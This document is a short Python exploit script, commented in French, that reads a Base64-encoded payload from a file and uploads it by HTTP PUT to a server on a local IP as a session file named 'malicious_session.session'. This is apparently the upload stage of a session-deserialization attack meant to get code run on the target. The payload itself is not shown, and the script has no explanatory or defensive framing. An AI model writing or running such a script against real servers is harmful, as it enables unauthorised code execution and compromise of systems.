import requests

target_url = "http://192.168.1.6:9090"
payload_file = "payload.b64"
session_id = "malicious_session"

# Lire le payload Base64
with open(payload_file, "r") as f:
    payload = f.read().strip()

# Envoyer la requête PUT
headers = {"Content-Type": "application/octet-stream"}
put_url = f"{target_url}/sessions/{session_id}.session"
response = requests.put(put_url, data=payload, headers=headers)

if response.status_code in [200, 201]:
    print("Payload uploaded successfully")
else:
    print(f"Failed to upload payload: {response.status_code}")
